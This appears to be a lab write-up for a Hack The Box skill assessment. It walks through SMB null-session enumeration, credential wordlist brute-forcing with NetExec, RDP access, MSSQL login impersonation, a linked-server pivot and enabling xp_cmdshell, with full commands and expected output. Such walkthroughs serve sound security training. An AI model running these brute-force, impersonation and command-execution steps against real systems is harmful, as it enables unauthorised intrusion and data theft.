---
tags: [lab, attack/network, enumeration/smb, enumeration/mssql]
module: attacking_common_services
last_updated: 2026-05-12
source_count: 1
---

# HTB Lab — Attacking Common Services: Hard Skill Assessment

**Difficulty:** Hard
**Target IP:** STMIP (your spawned machine IP)
**OS:** Windows Server 2019 (WIN-HARD)

Four questions with a multi-stage attack chain. The entry point is unauthenticated SMB share access that exposes per-user files containing password candidates. Those passwords unlock RDP access, which leads to a local MSSQL instance where user impersonation and a linked server chain elevate to OS-level command execution on a second SQL Server instance running as a privileged account.

```
SMB null session → department share → credential files
  → combine into wordlist → NetExec brute-force (Fiona)
    → RDP as Fiona → SQLCMD Windows Auth
      → IMPERSONATE john → linked server pivot
        → enable xp_cmdshell → read Administrator flag
```

---

## Question 1

> What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

---

## Phase 1 — Service Discovery

### Step 1 — nmap scan with host discovery disabled

```bash
nmap -A -Pn STMIP
```

The `-Pn` flag is important here: Windows hosts frequently block ICMP echo requests (ping) by firewall policy. Without `-Pn`, nmap sends a ping probe first and — getting no response — marks the host as down and skips the port scan entirely. `-Pn` skips the ping and scans ports directly, treating the host as up regardless.

Expected services:

| Port | Service | Version |
|------|---------|---------|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 445/tcp | microsoft-ds | SMB |
| 1433/tcp | ms-sql-s | Microsoft SQL Server 2019 15.00.2000 |
| 3389/tcp | ms-wbt-server | RDP (Microsoft Terminal Services) |

Key observations from nmap:
- **SMB signing is not required** (`signing:False` in SMB2 security mode) — relay attacks are possible
- **SQL Server 2019 RTM** — no service packs, worth noting for CVE research
- **Computer name: WIN-HARD** — this matters for MSSQL Windows Authentication later
- **RDP is open** — once credentials are found, GUI access is available

---

## Phase 2 — SMB Share Enumeration

### Step 2 — List shares without credentials (null session)

```bash
smbclient -N -L STMIP
```

| Flag | What it does |
|------|-------------|
| `-N` | Null session — connect without a username or password |
| `-L` | List mode — show available shares rather than opening one |

Expected output:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Home            Disk
IPC$            IPC       Remote IPC
```

The `ADMIN$` and `C$` shares are default Windows administrative shares that require admin credentials. The `IPC$` share is used for inter-process communication. The non-default share is **`Home`** — a custom share with no comment, accessible without credentials, which is the misconfiguration to exploit.

### Step 3 — Browse the Home share

```bash
smbclient -N //STMIP/Home
```

Inside the session, list the top-level directories:

```
smb: \> ls

  HR           D   0  Thu Apr 21 21:04:39 2022
  IT           D   0  Thu Apr 21 21:11:44 2022
  OPS          D   0  Thu Apr 21 21:05:10 2022
  Projects     D   0  Thu Apr 21 21:04:48 2022
```

The structure mirrors a real company file server organized by department. Navigate into `IT`:

```
smb: \> cd IT
smb: \IT\> ls

  Fiona    D   0  Thu Apr 21 21:12:01 2022
  John     D   0  Thu Apr 21 21:11:44 2022
  Simon    D   0  Thu Apr 21 21:12:15 2022
```

Per-user subdirectories inside the IT department folder. Each likely contains user-specific files.

### Step 4 — Download files from each user's directory

Navigate into each subdirectory and pull the files. The `prompt` command disables the confirmation prompt that `mget` normally shows before each file transfer:

```
smb: \IT\> cd Fiona\
smb: \IT\Fiona\> get creds.txt

smb: \IT\Fiona\> cd ../Simon\
smb: \IT\Simon\> get random.txt

smb: \IT\Simon\> cd ../John\
smb: \IT\John\> prompt
smb: \IT\John\> mget *
```

`mget *` with `prompt` turned off downloads every file in the directory without asking. John's directory contains three files: `information.txt`, `notes.txt`, and `secrets.txt`.

Files recovered:

| File | From user | Purpose in this lab |
|------|-----------|---------------------|
| `creds.txt` | Fiona | Credential candidates |
| `random.txt` | Simon | Q1 answer; credential candidates |
| `information.txt` | John | Credential candidates |
| `notes.txt` | John | Credential candidates |
| `secrets.txt` | John | Credential candidates |

**Answer to Question 1: `random.txt`**

---

## Question 2

> Enumerate the target and find a password for the user Fiona. What is her password?

---

## Phase 3 — Build a Targeted Wordlist

### Step 5 — Combine all recovered files

Every file retrieved from the share could contain passwords. Rather than testing them individually against each file, merge them into a single wordlist:

```bash
cat creds.txt secrets.txt random.txt information.txt notes.txt > passwords.txt
```

The rationale: internal file servers often hold documentation, notes, and credential lists created by IT staff. Users frequently store their own passwords or team passwords in text files on shared drives. All five files are potential password sources — treat all of them as such.

### Step 6 — Brute-force Fiona's SMB password with NetExec

```bash
nxc smb STMIP -u fiona -p passwords.txt
```

| Flag | What it does |
|------|-------------|
| `smb` | Protocol — authenticate against the SMB service on port 445 |
| `-u fiona` | Single username — Fiona had her own directory in the share, confirming she is a local account |
| `-p passwords.txt` | Wordlist — the combined file from Step 5 |

NetExec tests each password in sequence and marks results with `[+]` for success and `[-]` for failure:

```
SMB  10.129.x.x  445  WIN-HARD  [-] WIN-HARD\fiona:Windows Creds STATUS_LOGON_FAILURE
SMB  10.129.x.x  445  WIN-HARD  [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE
SMB  10.129.x.x  445  WIN-HARD  [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
```

**Answer to Question 2: `48Ns72!bns74@S84NNNSl`**

---

## Question 3

> Once logged in, what other user can we compromise to gain admin privileges?

---

## Phase 4 — RDP Access and MSSQL Enumeration

### Step 7 — Connect via RDP as Fiona

```bash
xfreerdp /v:STMIP /u:fiona /p:'48Ns72!bns74@S84NNNSl' /cert-ignore
```

The `/cert-ignore` flag bypasses the self-signed certificate warning. Without it, xfreerdp prompts you to accept the certificate interactively.

Once connected, open a PowerShell window from the Start menu or taskbar.

### Step 8 — Connect to the local MSSQL instance with Windows Authentication

From PowerShell:

```powershell
SQLCMD.EXE -S WIN-HARD
```

This connects to the default SQL Server instance on the local machine using **Windows Authentication** — the current Windows session (Fiona's login) is passed to SQL Server automatically, without needing a separate SQL username or password. The `-S WIN-HARD` specifies the server by computer name (which nmap identified earlier).

When you see the `1>` prompt, you are in the SQLCMD interactive session.

### Step 9 — Find impersonatable users

The MSSQL `IMPERSONATE` permission allows one login to execute queries as another. This is a serious misconfiguration when granted broadly: if you can impersonate a higher-privileged user, you inherit their permissions for the duration of the impersonation.

Query for all logins that any other principal has been granted `IMPERSONATE` rights over:

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Breaking down the query:

| Part | What it does |
|------|-------------|
| `sys.server_permissions` | Catalog view of all server-level permissions |
| `sys.server_principals` | Catalog view of all server-level logins and roles |
| `a.grantor_principal_id = b.principal_id` | Joins on who *granted* the permission — this is the login being impersonated |
| `WHERE a.permission_name = 'IMPERSONATE'` | Filters to only IMPERSONATE grants |
| `SELECT distinct b.name` | Returns the names of logins that can be impersonated |

Expected output:

```
name
-------------
john
simon
```

Both `john` and `simon` can be impersonated by Fiona's login. The question asks which one leads to admin privileges — the answer requires checking what each user can do. The next phase establishes that `john` is the path to sysadmin via a linked server.

**Answer to Question 3: `john`**

---

## Question 4

> Submit the contents of the flag.txt file on the Administrator Desktop.

---

## Phase 5 — Linked Server Pivot via Impersonation

### Step 10 — Discover linked servers

Still in the SQLCMD session, query the `sysservers` system table:

```sql
SELECT srvname, isremote FROM sysservers
GO
```

```
srvname                           isremote
--------------------------------- --------
WINSRV02\SQLEXPRESS                      1
LOCAL.TEST.LINKED.SRV                    0
```

The `isremote` column:
- `1` = remote server (a reference to another instance, used with `OPENQUERY`)
- `0` = linked server (a full linked server connection that supports `EXECUTE ... AT`)

`LOCAL.TEST.LINKED.SRV` is a linked server — a configured connection from this SQL Server instance to another SQL Server instance. Commands can be forwarded to it using `EXECUTE('...') AT [LOCAL.TEST.LINKED.SRV]`.

### Step 11 — Impersonate john and test access to the linked server

```sql
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO
```

Breaking this apart:

**`EXECUTE AS LOGIN = 'john'`** — switch the current execution context to john's login. From this point forward in the batch, all queries run as john rather than fiona. This works because Fiona has IMPERSONATE rights over john.

**`EXECUTE('...') AT [LOCAL.TEST.LINKED.SRV]`** — forward the inner query to the linked server. The inner query runs on that remote instance under whatever identity the linked server connection is configured to use.

**The inner query checks:**
- `@@servername` — name of the SQL Server instance on the other end
- `system_user` — the login identity the remote server sees
- `is_srvrolemember('sysadmin')` — whether that identity has sysadmin rights (1 = yes, 0 = no)

**Note on double single-quotes:** Inside a string passed to `EXECUTE('...')`, single quotes must be escaped by doubling them. `is_srvrolemember(''sysadmin'')` is the escaped form of `is_srvrolemember('sysadmin')`.

Expected output:

```
WINSRV02\SQLEXPRESS  Microsoft SQL Server 2019...  testadmin  1
```

Result: the linked server connects as `testadmin`, and `is_srvrolemember('sysadmin')` returns `1` — **testadmin is a sysadmin on the remote instance**. This is the admin privilege path through john.

### Step 12 — Enable xp_cmdshell on the linked server

`xp_cmdshell` is disabled by default. Enabling it requires sysadmin rights and two `sp_configure` calls: one to unlock advanced options, and one to enable the feature. Both must be executed on the linked server (where testadmin is sysadmin), not on the local instance:

```sql
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```

Expected output:

```
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Both changes confirmed. `xp_cmdshell` is now active on `LOCAL.TEST.LINKED.SRV`.

### Step 13 — Execute OS commands and read the flag

```sql
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO
```

The triple quoting: `''more c:\users\...''` — the outer double single-quotes escape the inner string for the `EXECUTE('...')` context. `more` is the Windows command-line equivalent of `cat` for reading files.

Expected output:

```
output
---------------------------------------------
HTB{...}
NULL
```

The flag is in the output column. The `NULL` row is normal — `xp_cmdshell` appends a NULL row after the last line of output.

---

## Understanding the Full Privilege Escalation Chain

```
Fiona (local user, no SQL admin)
  → IMPERSONATE john (granted on local SQL Server)
    → EXECUTE AT [LOCAL.TEST.LINKED.SRV]
      → runs as testadmin (sysadmin on remote instance)
        → enable xp_cmdshell on remote instance
          → OS commands run as the SQL Server service account
            → read Administrator desktop flag
```

Why this works even though Fiona is not a sysadmin locally:

1. **IMPERSONATE is a server-level permission** — it does not require sysadmin; any login can be granted IMPERSONATE over another
2. **The linked server connection uses a hardcoded credential** — when the local server forwards a query to the linked server, the remote server authenticates using a configured mapping. Here, john's identity is mapped to `testadmin` on the linked server, regardless of what john's local privileges are
3. **testadmin is sysadmin on the remote instance** — this gives full control over that instance, including enabling `xp_cmdshell`
4. **xp_cmdshell runs as the SQL Server service account** — on a typical Windows installation, this is either LocalSystem, NetworkService, or a dedicated service account. If it is a privileged account, it has read access to the Administrator desktop

---

## Lessons Learned

- **Always check SMB for unauthenticated share access** — `smbclient -N -L` costs nothing and frequently reveals shares containing credentials, keys, or configuration files left by administrators
- **Treat all recovered text files as potential password sources** — files named `creds.txt`, `secrets.txt`, `random.txt`, and `notes.txt` all exist for a reason. Combine them all before brute-forcing
- **NetExec is faster than Hydra for SMB credential testing** — SMB authentication is stateful and protocol-aware; NetExec handles it cleanly with clear `[+]`/`[-]` output
- **Windows Authentication SQLCMD connects silently** — `SQLCMD.EXE -S <hostname>` uses the current Windows login with no additional flags. Gaining RDP access as a service account user often grants implicit MSSQL access
- **Check IMPERSONATE permissions immediately after connecting to MSSQL** — the SQL query using `sys.server_permissions` and `sys.server_principals` is a standard post-auth step; any result is a potential privilege escalation path
- **Linked servers multiply attack surface** — a low-privilege local user who can impersonate a login that has linked server access may inherit sysadmin rights on an entirely separate SQL Server instance
- **xp_cmdshell on a linked server requires the payload to be on the remote end** — you cannot run `xp_cmdshell` locally against a remote server; `EXECUTE('xp_cmdshell ...') AT [server]` is the correct pattern

## Related pages

- [[attack/sql_databases]] — xp_cmdshell, IMPERSONATE, linked server lateral movement
- [[enumeration/mssql]] — Windows vs SQL auth, default databases, post-auth enumeration
- [[enumeration/smb]] — null sessions, share enumeration, smbclient
- [[attack/smb]] — SMB credential attacks, pass-the-hash
- [[tools/utility/xfreerdp]] — RDP client flags, cert-ignore, PTH
- [[tools/attack/netexec]] — SMB brute-force, credential spray
- [[tools/utility/sqlcmd]] — SQLCMD batch mode, Windows Authentication, GO syntax
- [[labs/htb/attacking_common_services/mssql_hash_theft_and_db_enumeration]] — companion MSSQL lab: xp_dirtree NTLMv2 theft and schema enumeration

## Sources

- raw/lab/attacking_common_services/lab_hard_skill_assessment.md
